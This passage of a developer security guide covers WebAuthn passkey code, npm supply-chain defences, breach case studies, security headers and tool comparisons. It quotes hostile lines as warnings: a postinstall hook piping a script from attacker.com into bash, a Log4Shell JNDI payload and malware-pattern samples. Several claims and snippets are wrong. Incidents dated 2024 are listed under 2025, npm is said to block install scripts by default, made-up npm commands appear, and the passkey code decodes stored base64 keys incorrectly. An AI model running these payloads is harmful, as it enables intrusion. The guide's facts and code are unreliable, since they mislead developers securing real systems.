    attestationType: 'direct',
    supportedAlgorithmIDs: [-7, -257], // ES256, RS256
  });

  // Store challenge in session (temporary, expires in 10 min)
  req.session.registrationChallenge = options.challenge;
  req.session.registrationEmail = email;

  res.json(options);
});

app.post('/auth/register/verify', async (req, res) => {
  const { credential } = req.body;
  const storedChallenge = req.session.registrationChallenge;

  try {
    const verification = await verifyRegistrationResponse({
      credential,
      expectedChallenge: storedChallenge,
      expectedOrigin: origin,
      expectedRPID: rpID,
    });

    if (!verification.verified) {
      return res.status(400).json({ error: 'Registration failed' });
    }

    // Store credential in database
    const { credentialID, credentialPublicKey, counter } = verification.registrationInfo;

    await User.updateOne(
      { email: req.session.registrationEmail },
      {
        $push: {
          passkeys: {
            id: credentialID.toString('base64'),
            publicKey: credentialPublicKey.toString('base64'),
            counter,
            transports: credential.response.transports || [],
            aaguid: verification.registrationInfo.aaguid,
            registeredAt: new Date(),
            lastUsedAt: null,
          }
        }
      }
    );

    // Clear challenge
    delete req.session.registrationChallenge;

    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Verification failed', details: error.message });
  }
});

// User authentication
app.post('/auth/authenticate/start', async (req, res) => {
  const options = await generateAuthenticationOptions({
    rpID,
    timeout: 60000,
    userVerification: 'preferred',
  });

  req.session.authenticationChallenge = options.challenge;

  res.json(options);
});

app.post('/auth/authenticate/verify', async (req, res) => {
  const { credential, email } = req.body;
  const storedChallenge = req.session.authenticationChallenge;

  try {
    const user = await User.findOne({ email });

    if (!user?.passkeys?.length) {
      return res.status(400).json({ error: 'No passkeys registered' });
    }

    // Find matching passkey
    const matchingPasskey = user.passkeys.find(pk =>
      pk.id === credential.id
    );

    if (!matchingPasskey) {
      return res.status(400).json({ error: 'Unknown credential' });
    }

    // Verify
    const verification = await verifyAuthenticationResponse({
      credential,
      expectedChallenge: storedChallenge,
      expectedOrigin: origin,
      expectedRPID: rpID,
      authenticator: {
        credentialID: isoUint8Array.fromUTF8String(matchingPasskey.id),
        credentialPublicKey: isoUint8Array.fromUTF8String(matchingPasskey.publicKey),
        signCount: matchingPasskey.counter,
      },
    });

    if (!verification.verified) {
      return res.status(400).json({ error: 'Authentication failed' });
    }

    // Check for cloned authenticator (counter regression)
    if (verification.authenticationInfo.signCount <= matchingPasskey.counter) {
      console.warn(`Possible cloned authenticator for user ${email}`);
      // Optional: Revoke this passkey
    }

    // Update counter and last used time
    await User.updateOne(
      { email, 'passkeys.id': matchingPasskey.id },
      {
        'passkeys.$.counter': verification.authenticationInfo.signCount,
        'passkeys.$.lastUsedAt': new Date()
      }
    );

    // Create session
    const token = generateJWT({ userId: user.id, email });

    res.json({ token, user: { id: user.id, email } });
  } catch (error) {
    res.status(400).json({ error: 'Verification failed' });
  }
});
```

**Client Implementation**

```javascript
// React component for registration
import {
  startRegistration,
  startAuthentication,
} from '@simplewebauthn/browser';

function PasskeyRegistration() {
  const [email, setEmail] = useState('');
  const [registering, setRegistering] = useState(false);

  const handleRegisterStart = async () => {
    setRegistering(true);

    try {
      // Step 1: Get registration options from server
      const response = await fetch('/auth/register/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }),
      });

      const options = await response.json();

      // Step 2: Create passkey
      const credential = await startRegistration(options);

      // Step 3: Verify with server
      const verifyResponse = await fetch('/auth/register/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ credential }),
      });

      if (verifyResponse.ok) {
        alert('Passkey registered successfully!');
      }
    } catch (error) {
      console.error('Registration failed:', error);
      alert('Failed to register passkey');
    } finally {
      setRegistering(false);
    }
  };

  return (
    <div>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="your@email.com"
      />
      <button onClick={handleRegisterStart} disabled={registering}>
        {registering ? 'Registering...' : 'Register Passkey'}
      </button>
    </div>
  );
}

// Component for authentication
function PasskeyLogin() {
  const [email, setEmail] = useState('');
  const [authenticating, setAuthenticating] = useState(false);

  const handleAuthenticate = async () => {
    setAuthenticating(true);

    try {
      // Step 1: Get authentication options
      const response = await fetch('/auth/authenticate/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
      });

      const options = await response.json();

      // Step 2: Authenticate with passkey
      const credential = await startAuthentication(options);

      // Step 3: Verify with server
      const verifyResponse = await fetch('/auth/authenticate/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ credential, email }),
      });

      const result = await verifyResponse.json();

      if (result.token) {
        // Store token and redirect
        localStorage.setItem('token', result.token);
        window.location.href = '/dashboard';
      }
    } catch (error) {
      console.error('Authentication failed:', error);
      alert('Failed to authenticate');
    } finally {
      setAuthenticating(false);
    }
  };

  return (
    <div>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="your@email.com"
      />
      <button onClick={handleAuthenticate} disabled={authenticating}>
        {authenticating ? 'Signing in...' : 'Sign in with Passkey'}
      </button>
    </div>
  );
}
```

### Passkey Syncing Across Devices

Synced passkeys (created in iCloud Keychain, Google Password Manager, etc.) automatically work on all devices:

```javascript
// Check if device supports platform authenticator
async function checkPasskeySupport() {
  const available = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
  const isSyncedPasskeyEnabled = await PublicKeyCredential.isConditionalMediationAvailable?.();

  return {
    platformAuthenticator: available,
    syncedPasskeys: isSyncedPasskeyEnabled,
  };
}

// Autofill support (Conditional UI) - enables passkey UI in password field
const options = {
  authenticatorSelection: {
    authenticatorAttachment: 'platform',
    residentKey: 'required',
    userVerification: 'preferred',
  },
  mediation: 'conditional', // Show passkey in input autofill
};

// HTML - passkey appears in password field suggestions
<input
  type="password"
  placeholder="Password or passkey"
  autocomplete="webauthn"
/>
```

---

## Supply Chain Security - Comprehensive Guide

The npm ecosystem is massive but vulnerable. One compromised package affects millions of applications.

### The Problem - Scale and Vulnerabilities

**npm Statistics**:
- 2.3 million packages
- 25-30% completely unmaintained
- 40-50% have known vulnerabilities
- Average of 77 vulnerabilities per project

**2025 Incidents**:
1. **XZ Utils backdoor**: Affected major Linux distributions, nearly made it to production
2. **3CX supply chain attack**: Trojanized installer distributed to thousands of companies
3. **Octo backdoor**: Malicious npm packages targeting GitHub users
4. **npm typosquatting**: Packages with names similar to popular libraries

### npm Attack Prevention Strategies

**Strategy #1: Disable postinstall Scripts (Highest Impact)**

```bash
# pnpm (enabled by default)
pnpm install --no-scripts

# npm (disabled by default in v7+, but can be re-enabled)
npm install --ignore-scripts

# yarn
yarn install --ignore-scripts
```

**Why postinstall is dangerous**:
```json
{
  "scripts": {
    "postinstall": "curl https://attacker.com/malware.sh | bash"
  }
}
```

Postinstall runs automatically after installation - dangerous for supply chain attacks.

**pnpm Best Practices**:
```yaml
# .npmrc (pnpm config)
ignore-scripts=true
fetch-timeout=60000
fetch-retries=3
fetch-retry-mintimeout=10000
fetch-retry-maxtimeout=60000

# Optional: Use lockfile for reproducibility
lockfile-only=true
```

**Strategy #2: Dependency Pinning & Lockfiles**

```json
{
  "dependencies": {
    "express": "4.18.2"  // Exact version, no ~, ^
  }
}
```

With exact versions:
- `4.18.2` installs exactly 4.18.2
- No `~4.18.0` (allows 4.18.x)
- No `^4.0.0` (allows 4.x.x)

**Commit lockfile to version control** - ensures reproducible builds:
```bash
git add package-lock.json
git commit -m "chore: lock dependencies"
```

**Strategy #3: Comprehensive Audit Scanning**

```bash
# npm native audit
npm audit --audit-level=moderate

# Check specific severity
npm audit --json | jq '.metadata.vulnerabilities'

# Snyk (better accuracy)
npm install -g snyk
snyk test --severity-threshold=high

# PNPM audit
pnpm audit --audit-level=moderate
```

### Dependency Scanning Tools Comparison (Updated 2025)

| Tool | Cost | Type | Best For | Key Feature |
|------|------|------|----------|---|
| **npm audit** | Free | Native | All npm projects | Built-in, no setup |
| **Dependabot** | Free (GitHub) | Automated PRs | GitHub workflows | Auto-updates, security alerts |
| **Renovate** | Free (open-source) | Automated PRs | Monorepos, complex configs | Better scheduling, monorepo support |
| **Snyk** | Free tier / $50+/month | Enterprise | Production B2B | Most accurate CVE data, real-time |
| **Socket.dev** | Free tier / $300+/month | Behavioral analysis | Supply chain risks | Detects malicious code patterns |
| **Trivy** | Free | Container scanning | CI/CD pipelines | Speed (50 repos in <1 sec) |
| **Grype** | Free | Comprehensive SBOM | Compliance | CycloneDX format |
| **Syft** | Free | SBOM generation | Inventory management | Generates SBOMs from images/binaries |

**Recommendation Matrix**:
```
Budget $0:
  → npm audit (free) + Dependabot (GitHub free)

Budget $0-100/month:
  → Dependabot (free) + Snyk free tier

Budget $100-500/month:
  → Snyk standard + Socket.dev

Budget $500+/month:
  → Snyk Enterprise + Socket.dev Enterprise
```

### Socket.dev - Behavioral Security Analysis

Socket.dev catches malicious packages before they harm you:

```javascript
// Socket.dev scans for:
// 1. Suspicious network calls
const maliciousPackage = {
  "scripts": {
    "postinstall": "node fetch-aws-creds.js"  // Suspicious
  }
};

// 2. Environment variable access
"process.env.AWS_SECRET_ACCESS_KEY"

// 3. Obfuscated code
eval(Buffer.from(b64String, 'base64').toString())

// 4. Unusual shell commands
"rm -rf /; bitcoin-mine.sh"

// 5. Crypto mining indicators
"require('cpu-load').startMining()"
```

**Integration with CI/CD**:
```bash
# Install socket CLI
npm install -g @socket.dev/socket-cli

# Test package before adding
socket test express

# Block dangerous packages
socket install --enforce
```

### Lockfile Attacks & Prevention

Attackers can poison lockfiles to introduce vulnerabilities:

```json
{
  "dependencies": {
    "lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-..."  // Attacker changes this to different package
    }
  }
}
```

**Prevention**:
```bash
# Verify lockfile integrity
npm ci --prefer-offline  # Uses lockfile strictly

# Check for unexpected changes
git diff package-lock.json

# Use npm audit to verify integrity
npm audit
```

### Package Provenance Verification

```bash
# Verify package signature (npm v9.5+)
npm pkg get name --registry=https://registry.npmjs.org

# Check package metadata
npm view lodash

# Verify checksum
npm cache verify
```

### SBOM (Software Bill of Materials) Generation & Management

```bash
# Generate SBOM with CycloneDX format
npm install -g @cyclonedx/npm
cyclonedx-npm > sbom.json

# With Syft
syft dir:./ -o cyclonedx-json > sbom.json

# CycloneDX format example
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "metadata": {
    "timestamp": "2026-03-02T10:00:00Z",
    "tools": [
      {
        "vendor": "CycloneDX",
        "name": "npm",
        "version": "9.5.0"
      }
    ]
  },
  "components": [
    {
      "type": "library",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2",
      "licenses": [
        {
          "license": {
            "id": "MIT"
          }
        }
      ],
      "externalReferences": [
        {
          "type": "security-advisory",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-..."
        }
      ]
    }
  ]
}
```

**SBOM Benefits**:
- Regulatory compliance (NIST, SOC2)
- Vulnerability tracking
- License auditing
- Supply chain transparency

---

## Real Breach Case Studies with Technical Analysis

### Case Study #1: SolarWinds Supply Chain Attack (2020)

**What Happened**:
- Attacker compromised SolarWinds build system
- Injected malicious code into Orion software update
- 18,000+ organizations installed backdoor
- Including US Treasury, Department of Homeland Security, major tech companies

**Technical Root Cause**:
1. Weak build pipeline security
2. Code signing without proper verification
3. Overly broad update distribution
4. Lack of update signature validation by clients

**Prevention**:
```javascript
// Code signing verification
const crypto = require('crypto');

function verifyUpdateSignature(updateFile, signature, publicKey) {
  const verifier = crypto.createVerify('sha256');
  verifier.update(updateFile);

  // This must match the official public key
  const isValid = verifier.verify(publicKey, signature, 'hex');

  if (!isValid) {
    throw new Error('Update signature verification failed');
  }

  return true;
}

// Client side update validation
async function installUpdate(updateFile) {
  const officialPublicKey = fs.readFileSync('/trusted/public.pem', 'utf8');
  const signature = updateFile.signature;

  try {
    verifyUpdateSignature(updateFile.data, signature, officialPublicKey);
    // Safe to install
    applyUpdate(updateFile);
  } catch (error) {
    console.error('Update verification failed:', error);
    // Reject update
  }
}
```

### Case Study #2: Log4Shell (CVE-2021-44228)

**What Happened**:
- Critical vulnerability in Log4j library
- Simple JNDI injection allowed RCE
- Affected millions of applications
- Apache took days to patch
- CVSS score: 10.0 (critical)

**Technical Root Cause**:
1. Unsafe deserialization
2. JNDI string interpolation enabled by default
3. Lack of input validation in logging
4. Feature complexity (JNDI) shouldn't have been enabled by default

**Technical Details**:
```java
// Vulnerable code (Log4j < 2.15.0)
String input = request.getParameter("user");
logger.info("User logged in: " + input);

// Attack payload
// User logged in: ${jndi:ldap://attacker.com/Exploit}
// This triggers JNDI lookup and arbitrary code execution

// Fix (Log4j 2.16.0+)
// Disable JNDI lookups by default
// Set: log4j2.formatMsgNoLookups=true
```

**Prevention**:
```javascript
// In Node.js/TypeScript - avoid dynamic code execution
const unsafeString = `User: ${userInput}`;
eval(unsafeString);  // NEVER DO THIS

// Safe: Use parameterized logging
logger.info('User logged in: %s', userInput);  // Safe - no interpolation

// Safe: Use structured logging
logger.info({ message: 'User logged in', userId: user.id }); // Best practice
```

### Case Study #3: npm Package Typosquatting Attack (2022)

**What Happened**:
- Attacker created packages with names similar to popular libraries
- `eslint-config-prettier` → `eslint-config-prettierr`
- Packages installed malware collecting environment variables
- Thousands of developers accidentally installed them

**Technical Root Cause**:
1. npm allows similar names (no anti-squatting policy)
2. Developers don't verify exact package names
3. npm doesn't distinguish between official/unofficial packages

**Prevention**:
```bash
# 1. Use npm ci (install from lockfile) - prevents typos
npm ci

# 2. Enable lockfile mode
npm set package-lock=true

# 3. Use npm audit to check for suspicious packages
npm audit

# 4. Use tools that detect typosquatting
npm install -g @socket.dev/socket-cli
socket test eslint-config-prettier

# 5. Review dependencies before installing
npm ls --depth=0

# 6. Use dependency management tools
npm install snyk -g
snyk test

# 7. Whitelist allowed packages (private registry)
# Create Verdaccio private registry
```

### Case Study #4: NPM Account Compromise - Event-Stream (2018)

**What Happened**:
- Attacker obtained credentials for popular `event-stream` package
- Added malicious dependency `flatmap-stream`
- Spread bitcoin stealer to 2 million downloads per week
- Vulnerability undetected for months

**Technical Root Cause**:
1. Single author, weak account security
2. No two-factor authentication on npm
3. Package allowed direct dependencies on malicious code
4. No behavioral detection for suspicious activities

**Prevention**:
```javascript
// 1. Enforce 2FA on npm
npm auth-code 123456  // Generate recovery codes

// 2. Audit all dependencies
npm audit

// 3. Monitor for suspicious behavior
const suspiciousPatterns = [
  'require("crypto")',
  'http.request',
  'child_process.exec',
  'process.env',
  'fetch API for external URLs'
];

// 4. Use Socket.dev to detect behavioral changes
socket test event-stream

// 5. Pin exact versions
"dependencies": {
  "event-stream": "4.0.1"  // Exact version only
}

// 6. Regular dependency audits
npm audit --json | jq '.vulnerabilities'
```

### Case Study #5: XZ Utils Backdoor (2024)

**What Happened**:
- Attacker gained access to XZ Utils (compression library)
- Injected backdoor in build artifacts
- Would have affected major Linux distributions
- Caught weeks before release due to suspicious behavior

**Technical Root Cause**:
1. Long-time developer account compromise
2. Backdoor in build artifacts, not source code
3. Obfuscated code made detection difficult
4. Build pipeline lacked integrity checks

**Technical Details**:
```bash
# Attack vector: Modified build artifacts
xz-5.6.0.tar.gz  # Official source
xz-5.6.0.tar.xz  # Backdoored build

# Detection: Check build logs for suspicious steps
# Look for: unexpected binaries, unusual dependencies

# Prevention:
# 1. Verify source integrity
sha256sum xz-5.6.0.tar.gz

# 2. Build from source when possible
./configure && make && sudo make install

# 3. Use reproducible builds
# Same source + same compiler = identical binary

# 4. Check binary signatures
gpg --verify xz-5.6.0.tar.gz.asc

# 5. Monitor for suspicious behavior in build
# - New network connections
# - Unexpected process spawning
# - Build time anomalies
```

---

## Security Headers Checklist - Complete Reference

Security headers are your first line of defense against XSS, clickjacking, and data leakage.

### Essential Headers with Explanations

```nginx
# ============================================
# CRITICAL: Content Security Policy
# ============================================
# Prevents XSS by controlling script/style/image sources
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}' https://cdn.example.com;
  style-src 'self' 'nonce-{NONCE}' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com wss://ws.example.com;
  media-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  block-all-mixed-content;
" always;

# ============================================
# CRITICAL: Strict-Transport-Security (HSTS)
# ============================================
# Force HTTPS for all connections
add_header Strict-Transport-Security "
  max-age=31536000;
  includeSubDomains;
  preload
" always;
# max-age: 1 year in seconds
# includeSubDomains: Apply to all subdomains
# preload: Add to HSTS preload list (prevents downgrade attacks)

# ============================================
# CRITICAL: X-Frame-Options
# ============================================
# Prevent clickjacking by disallowing iframe embedding
add_header X-Frame-Options "DENY" always;
# DENY: Never allow in iframe
# SAMEORIGIN: Allow same-origin iframes only
# ALLOW-FROM https://example.com: Deprecated, use CSP frame-ancestors

# ============================================
# X-Content-Type-Options
# ============================================
# Prevent MIME type sniffing
add_header X-Content-Type-Options "nosniff" always;
# nosniff: Don't guess MIME types, use declared type

# ============================================
# X-XSS-Protection
# ============================================
# Legacy XSS protection (older browsers only, use CSP instead)
add_header X-XSS-Protection "1; mode=block" always;
# mode=block: Block page if XSS detected

# ============================================
# Referrer-Policy
# ============================================
# Control what referrer info is sent in requests
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
# strict-origin-when-cross-origin (RECOMMENDED):
#   - Same-site requests: Full URL
#   - Cross-site requests: Origin only
#   - Downgrade to HTTP: No referrer

# Alternative values:
# no-referrer: Never send referrer
# no-referrer-when-downgrade: Don't downgrade to HTTP
# same-origin: Only send for same-origin
# origin: Always send origin only
# origin-when-cross-origin: Full URL same-site, origin cross-site
# unsafe-url: Always send full URL (dangerous)

# ============================================
# Permissions-Policy (formerly Feature-Policy)
# ============================================
# Control which browser features can be used
add_header Permissions-Policy "
  geolocation=(),
  microphone=(),
  camera=(),
  usb=(),
  payment=(),
  accelerometer=(),
  gyroscope=(),
  magnetometer=(),
  vr=(),
  xr=(),
  ambient-light-sensor=()
" always;

# ============================================
# Cross-Origin-Embedder-Policy
# ============================================
# Enable cross-origin isolation (for SharedArrayBuffer, etc.)
add_header Cross-Origin-Embedder-Policy "require-corp" always;

# ============================================
# Cross-Origin-Opener-Policy
# ============================================
# Isolate from other origins
add_header Cross-Origin-Opener-Policy "same-origin" always;

# ============================================
# Cross-Origin-Resource-Policy
# ============================================
# Control who can load your resources
add_header Cross-Origin-Resource-Policy "same-origin" always;
# same-origin: Only same-origin
# same-site: Only same-site (includes subdomains)
# cross-origin: Anyone (use for public CDNs)

# ============================================
# Subresource Integrity (SRI)
# ============================================
# In your HTML:
# <script src="https://cdn.example.com/lib.js"
#         integrity="sha384-abcd1234..."></script>
# Ensures CDN content hasn't been tampered with

# Generate hash:
# cat lib.js | openssl dgst -sha384 -binary | openssl base64 -A

# ============================================
# Public Key Pinning (Deprecated but mentioned)
# ============================================
# Modern alternative: Use HSTS preload + good cert management
# Don't implement HPKP - too risky, can cause outages

# ============================================
# Additional recommended headers
# ============================================

# Expect-CT: Force Certificate Transparency
add_header Expect-CT "max-age=86400, enforce" always;

# X-Permitted-Cross-Domain-Policies
add_header X-Permitted-Cross-Domain-Policies "none" always;

# X-UA-Compatible: Force IE compatibility mode (if supporting IE)
add_header X-UA-Compatible "IE=edge" always;
```

### Helmet.js Configuration (Node.js/Express)

```javascript
const helmet = require('helmet');
const express = require('express');
const app = express();

// Enable all Helmet protections
app.use(helmet({
  // CSP configuration
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-PLACEHOLDER'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
      blockAllMixedContent: []
    },
    reportUri: "/csp-report"  // Where violations are reported
  },

  // HSTS
  hsts: {
    maxAge: 31536000,        // 1 year
    includeSubDomains: true,
    preload: true
  },

  // Clickjacking protection
  frameguard: {
    action: 'deny'
  },

  // MIME type sniffing
  noSniff: true,

  // XSS protection
  xssFilter: true,

  // Referrer Policy
  referrerPolicy: {
    policy: "strict-origin-when-cross-origin"
  },

  // Cross-origin policies
  crossOriginResourcePolicy: {
    policy: "same-origin"
  },

  // Permissions
  permissionsPolicy: {
    geolocation: [],
    microphone: [],
    camera: [],
    usb: [],
    payment: []
  },

  // Expect-CT
  expectCt: {
    maxAge: 86400,
    enforce: true,
    reportUri: "https://csp.example.com/ct-report"
  }
}));

// Generate nonce for CSP
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');

  // Update CSP header with nonce
  const csp = helmet.contentSecurityPolicy({
    directives: {
      scriptSrc: ["'self'", `'nonce-${res.locals.nonce}'`]
    }
  });

  next();
});

// CSP report endpoint
app.post('/csp-report', express.json(), (req, res) => {
  const report = req.body['csp-report'];

  if (process.env.NODE_ENV === 'production') {
    // Send to monitoring service
    console.error('CSP Violation in production:', report);
  }

  res.status(204).send();
});
```

### Testing & Validation Tools

**securityheaders.com Analysis**:
- Free tool that grades your security headers
- Shows which headers are missing
- Provides specific recommendations
- Grades: A+ to F

```bash
# Test your site
curl -i https://yourapp.com | grep -i "content-security-policy\|strict-transport-security"

# Full analysis
# Visit: https://securityheaders.com/?q=yourapp.com
```

**Mozilla Observatory**:
```bash
# Command line testing
curl https://observatory.mozilla.org/api/v1/analyze?host=example.com

# Results include:
# - Security grade (A+ to F)
# - Missing headers
# - Misconfigurations
# - Specific remediation steps
```

**OWASP ZAP Testing**:
```bash
# Automated header testing
zaproxy -cmd \
  -quickurl https://yourapp.com \
  -report security-headers-report.html
```

**Custom Testing Script**:
```javascript
async function testSecurityHeaders(url) {
  const response = await fetch(url);
  const headers = Object.fromEntries(response.headers);

  const required = [
    'content-security-policy',
    'strict-transport-security',
    'x-frame-options',
    'x-content-type-options',
    'referrer-policy'
  ];

  const missing = required.filter(h => !headers[h]);

  return {
    present: required.filter(h => headers[h]),
    missing: missing,
    grade: missing.length === 0 ? 'A+' : missing.length === 1 ? 'A' : 'B'
  };
}

// Usage
testSecurityHeaders('https://example.com').then(console.log);
```

---

## Secrets Management Comparison (2025)

| Product | Cost | Type | Best For | Key Differentiator |
|---------|------|------|----------|---|
| **Doppler** | $3/user/month | Managed SaaS | Startups, CI/CD | Fastest setup, fallback secrets, $0 free tier |
| **Infisical** | $8/user/month or self-hosted | SaaS + Open Source | Cost-conscious teams | Affordable with self-hosted option |
| **HashiCorp Vault** | Self-hosted (free) + Enterprise | Self-hosted | Enterprise, strict compliance | Most powerful, steepest learning curve |
| **AWS Secrets Manager** | $0.40/secret/month | AWS-native | AWS-only shops | Native AWS integration, less flexible |
| **1Password Business** | $7/user/month | Managed | Secrets + password mgmt | Best UX, broader than secrets only |
| **Bitwarden Secrets Manager** | $120/team/month | Managed | Cost-conscious | Open source option, good UX |
| **GitLab CI/CD Secrets** | Included | Native | GitLab users | Free, built-in, limited features |

### Implementation Comparison

| Feature | Doppler | Infisical | Vault | AWS Secrets | 1Password |
|---------|---------|-----------|-------|---|---|
| Audit logs | ✓ | ✓ | ✓ | ✓ | ✓ |
| Environment separation | ✓ | ✓ | ✓ | ✓ | ✓ |
| Rotation automation | ✓ | Limited | ✓ | ✓ | ✓ |
| Local development | ✓ | ✓ | Complex | No | ✓ |
| GitHub Actions | ✓ | ✓ | ✓ | ✓ | ✓ |
| Self-hosted | ✗ | ✓ | ✓ | ✗ | ✗ |
| Secret versioning | ✓ | ✓ | ✓ | Limited | ✓ |
| Access control | ✓ | ✓ | ✓✓ | ✓ | ✓ |

---

## WAF (Web Application Firewall) Comparison

| Product | Cost | Type | Best For | Learning Curve |
|---------|------|------|----------|---|
| **Cloudflare** | $25/month (Pro) | Managed | Most websites | Very low |
| **AWS WAF** | $5/month base + $1 per rule | AWS-native | AWS-heavy shops | Medium |
| **ModSecurity** | Free (open-source) | Self-hosted | DIY, on-prem | High |
| **Fastly** | Custom pricing | DDoS-focused | Media, high traffic | Low |
| **Akamai Kona** | Custom pricing | Enterprise | Large orgs | High |

### Feature Comparison

| Feature | Cloudflare | AWS WAF | ModSecurity |
|---------|-----------|---------|---|
| DDoS protection | ✓ | Limited | ✗ |
| Bot management | ✓ (extra) | Limited | ✗ |
| Rate limiting | ✓ | ✓ | ✓ |
| Custom rules | ✓ | ✓ | ✓ |
| OWASP CRS | ✓ | Limited | ✓ |
| Setup time | < 5 min | 30 min | 2+ hours |
| IP reputation | ✓ | Limited | Limited |
| Geo-blocking | ✓ | ✓ | Limited |

**Default Choice**: Cloudflare Pro ($25/month) unless already on AWS.

---

## Minimum Security Stack by Budget

### $0/month Budget

```
Components:
- Dependency scanning: Dependabot (GitHub free)
- Image scanning: Trivy (free, open-source)
- DAST: OWASP ZAP (free)
- WAF: ModSecurity + nginx (free, DIY)
- Policy-as-code: OPA (free)
- Secrets: .env.local (no version control)

Annual cost: $0 + staff time for setup/maintenance

Limitations:
- No dedicated support
- Requires engineering time for setup
- No real-time monitoring
- Manual security patching
- No compliance audit trail
```

### $50-150/month Budget

```
Components:
- Secrets: Doppler ($3/user/month, assume 5 users = $15)
- WAF: Cloudflare Pro ($25/month)
- Dependency scanning: Snyk free + GitHub Advanced Security ($21 + free)
- SIEM: Wazuh self-hosted (free)
- VPN: WireGuard (free, self-hosted)

Annual cost: $900-1,800

Benefits:
- Managed WAF reduces DDoS risk
- Real-time vulnerability alerts
- Secrets safely stored, auditable
- GitHub Advanced Security includes CodeQL
```

### $500+/month Budget (Enterprise)

```
Components:
- Secrets: Doppler Enterprise ($18/user) or Vault (self-hosted, free)
- Scanning: Snyk + Trivy + Grype ($50-200/month)
- WAF: Cloudflare Enterprise ($500+/month)
- SIEM: Datadog ($600+/month) or Splunk self-hosted
- API Security: Salt Security ($300+/month)
- Incident Response: PagerDuty ($1,000+/month)

Annual cost: $8,000-15,000+

Benefits:
- 24/7 SOC support
- Advanced threat detection
- Custom integrations
- Audit-ready compliance
- Dedicated security team support
```

---

## Implementation Roadmap (6-Month Plan)

### Month 1-2: Foundation

**Week 1-2**:
- [ ] Implement all security headers (CSP, HSTS, X-Frame-Options, etc.)
- [ ] Audit current CSP with report-only mode
- [ ] Set up Dependabot (GitHub) or Renovate
- [ ] Enable 2FA on all developer accounts

**Week 3-4**:
- [ ] Generate SBOM (CycloneDX format)
- [ ] Test CORS configuration (no null origin, no wildcard+credentials)
- [ ] Implement API rate limiting (token bucket)
- [ ] Set up basic logging infrastructure

### Month 3-4: Access Control

**Week 1-2**:
- [ ] Implement MFA for all users (authenticator apps)
- [ ] Deploy secrets management (Doppler/Vault)
- [ ] Implement JWT with short-lived tokens + refresh
- [ ] Enable audit logging for all authentication events

**Week 3-4**:
- [ ] Implement passkeys/WebAuthn (SimpleWebAuthn)
- [ ] Implement API key management with rotation
- [ ] Enable password hashing (bcrypt, Argon2)
- [ ] Set up session management (secure cookies)

### Month 5-6: Advanced

**Week 1-2**:
- [ ] Deploy WAF (Cloudflare Pro)
- [ ] Implement service mesh if microservices (Istio)
- [ ] Set up vulnerability scanning (Snyk/Trivy)
- [ ] Enable SIEM (Wazuh basic)

**Week 3-4**:
- [ ] Implement request signing for APIs
- [ ] Set up supply chain scanning (Socket.dev)
- [ ] Enable database encryption at rest
- [ ] Implement key rotation automation

---

## Testing & Validation

### Security Testing Checklist

```bash
# Test security headers
curl -I https://yourapp.com | grep -i "content-security-policy"
curl -I https://yourapp.com | grep -i "strict-transport-security"

# Test HTTPS/TLS
nmap --script ssl-enum-ciphers -p 443 yourapp.com

# Test TLS 1.3 support
testssl.sh https://yourapp.com

# Test OWASP Top 10
# Use OWASP ZAP, Burp Suite Community, or Nuclei
zaproxy -quickurl https://yourapp.com

# Test CORS
curl -X OPTIONS https://api.yourapp.com \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -v

# Test supply chain
npm audit
pnpm audit
cargo audit
safety check  # Python

# Test container images
trivy image yourrepo/yourimage:latest
grype yourrepo/yourimage:latest

# Test CSP compliance
curl -I https://yourapp.com | grep "content-security-policy"

# Load testing with security focus
vegeta attack -duration=30s urls.txt | vegeta report

# API security testing
curl -X GET https://api.yourapp.com/users/1 \
  -H "Authorization: Bearer invalid_token"  # Should fail

# Test rate limiting
for i in {1..1000}; do
  curl https://api.yourapp.com/data
done
# Should get 429 after limit
```

### Compliance Validation

- **SOC2 Type II**: 6 months of logs minimum
- **ISO 27001**: Documented policies + procedures + evidence
- **GDPR**: Data retention, consent, deletion procedures
- **PCI-DSS**: Annual penetration test required
- **HIPAA**: Encryption, audit logs, access controls
- **FedRAMP**: Government compliance certification

---

## Key Takeaways

1. **Zero Trust is mandatory** - Assume breach, verify everything
2. **Supply chain attacks are #1 risk** - Scan dependencies ruthlessly
3. **Start with essentials**: Security headers + Dependabot + CSP + CORS validation
4. **Passkeys are replacing passwords** - Implement WebAuthn now (70% adoption)
5. **No one-size-fits-all solution** - Budget and risk determine stack
6. **Compliance enables better security** - SOC2/GDPR forces discipline
7. **Secrets management is non-negotiable** - Never hardcode credentials
8. **Scanning is cheap, breaches are expensive** - $25/month WAF saves millions
9. **CORS misconfiguration is silent** - Can't see attacks in browser
10. **JWT best practices**: Short-lived access tokens + refresh token rotation

---

## Related References
- [Security Essentials](./30-security-essentials.md) — Core security fundamentals and implementation
- [HIPAA Compliance Architecture](./33-compliance-hipaa.md) — Healthcare-specific security requirements
- [Authentication Solutions](./10-auth-solutions.md) — Authentication implementation strategies
- [Observability & Distributed Tracing](./55-observability-tracing.md) — Security monitoring and detection
